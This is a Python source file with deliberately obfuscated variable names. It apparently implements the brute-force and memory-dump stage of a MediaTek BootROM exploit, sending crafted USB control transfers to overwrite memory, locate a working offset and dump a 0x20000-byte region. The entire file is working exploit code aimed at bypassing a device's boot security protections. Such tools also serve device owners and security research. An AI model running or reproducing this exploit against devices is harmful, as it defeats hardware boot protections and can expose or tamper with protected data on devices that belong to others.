from src .common import to_bytes ,from_bytes #line:1
import usb #line:3
import array #line:4
import struct #line:5
def bruteforce (O0OOOOO00OOOO000O ,OO00OO0O000000O0O ,O00O00OOOOO0O0OO0 ,dump =False ):#line:7
    O0000000O0O00O0O0 =OO00OO0O000000O0O .watchdog_address +0x50 #line:9
    try :#line:13
        O0OOOOO00OOOO000O .dev .timeout =1 #line:14
    except Exception :#line:15
        pass #line:16
    OOO00OO0000O0O00O =O0OOOOO00OOOO000O .udev #line:18
    try :#line:20
        OOO00OO0000O0O00O ._ctx .managed_claim_interface =lambda *O0OOO0O0OOO0O00OO ,**O00O00000OOOO0O0O :None #line:22
    except AttributeError as OOO0OO000OO0000O0 :#line:23
        raise RuntimeError ("libusb is not installed for port {}".format (O0OOOOO00OOOO000O .dev .port ))from OOO0OO000OO0000O0 #line:24
    OOOO0OO0O00OO00OO =OOO00OO0000O0O00O .ctrl_transfer (0xA1 ,0x21 ,0 ,0 ,7 )+array .array ('B',[0 ])#line:26
    if dump :#line:28
        try :#line:29
            O0OOOOO00OOOO000O .cmd_da (0 ,0 ,1 )#line:30
            O0OOOOO00OOOO000O .read32 (O0000000O0O00O0O0 )#line:31
        except :#line:32
            pass #line:33
        for OO00OO0000O0000OO in range (4 ):#line:35
            OOO00OO0000O0O00O .ctrl_transfer (0x21 ,0x20 ,0 ,0 ,OOOO0OO0O00OO00OO +array .array ('B',to_bytes (O00O00OOOOO0O0OO0 -6 +(4 -OO00OO0000O0000OO ),4 ,'<')))#line:36
            OOO00OO0000O0O00O .ctrl_transfer (0x80 ,0x6 ,0x0200 ,0 ,9 )#line:37
        OOO0O0O00O00OOOOO =bytearray (O0OOOOO00OOOO000O .cmd_da (0 ,0 ,0x20000 ))#line:39
        OOO0O0O00O00OOOOO [O00O00OOOOO0O0OO0 -1 :]=b"\x00"+to_bytes (0x100030 ,4 ,'<')+OOO0O0O00O00OOOOO [O00O00OOOOO0O0OO0 +4 :]#line:40
        return OOO0O0O00O00OOOOO #line:41
    else :#line:43
        try :#line:44
            O0OOOOO00OOOO000O .cmd_da (0 ,0 ,1 )#line:45
            O0OOOOO00OOOO000O .read32 (O0000000O0O00O0O0 )#line:46
        except :#line:47
            pass #line:48
        for OOO0O0O0O0O0O000O in range (O00O00OOOOO0O0OO0 ,0xffff ,4 ):#line:50
            for OO00OO0000O0000OO in range (3 ):#line:51
                OOO00OO0000O0O00O .ctrl_transfer (0x21 ,0x20 ,0 ,0 ,OOOO0OO0O00OO00OO +array .array ('B',to_bytes (OOO0O0O0O0O0O000O -5 +(3 -OO00OO0000O0000OO ),4 ,'<')))#line:52
                OOO00OO0000O0O00O .ctrl_transfer (0x80 ,0x6 ,0x0200 ,0 ,9 )#line:53
            try :#line:54
                if (len (O0OOOOO00OOOO000O .cmd_da (0 ,0 ,0x40 )))==0x40 :#line:55
                    return (True ,OOO0O0O0O0O0O000O )#line:56
            except RuntimeError :#line:57
                try :#line:58
                    O0OOOOO00OOOO000O .read32 (O0000000O0O00O0O0 )#line:59
                except :#line:60
                    return (False ,OOO0O0O0O0O0O000O +4 )#line:61
            except Exception :#line:62
                return (False ,OOO0O0O0O0O0O000O +4 )#line:63
